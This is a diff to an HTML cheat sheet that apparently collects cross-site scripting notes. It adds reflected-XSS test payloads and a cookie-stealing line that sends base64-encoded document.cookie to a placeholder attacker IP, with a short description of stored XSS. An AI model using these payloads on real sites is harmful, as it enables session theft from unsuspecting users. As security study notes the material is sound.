@@ -88,11 +88,22 @@
 <pre><div class="column" style="display: inline-block; text-align: left; background-color:gray;">
 <details>
 <summary>REFLECTED TECHNIQUES</summary>
-<p>DESCRIPTION: </p>
+<p>DESCRIPTION:  </p>
+<p>
+COMMON TESTS:
+<script>alert('XSS');</script> || NORMAL TEST TO KNOW IF VULN EXIST	
+
+<script>alert(document.cookie);</script> || NORMAL TEST TO RETRIEVE COOKIES
+
+fecth('http://IP_ADDR/${btoa(document.cookie)}') || STOLE ENCODED BASE64 COOKIE, SENT TO ATTACKER MACHINE
+*for this to work, it is needed a python server or any listener to retrieve the content.
+
+</p>
 </details>
 <details>
 <summary>STORED TECHNIQUES</summary>
-<p>DESCRIPTION: </p>
+<p>DESCRIPTION: It is when data (exploit) is stored in the webpage without any restriction. So it can be used to exploit any user that
+loads the vulnerable page. </p>
 </details>
 <details>
 <summary>DOM TECHNIQUES</summary>
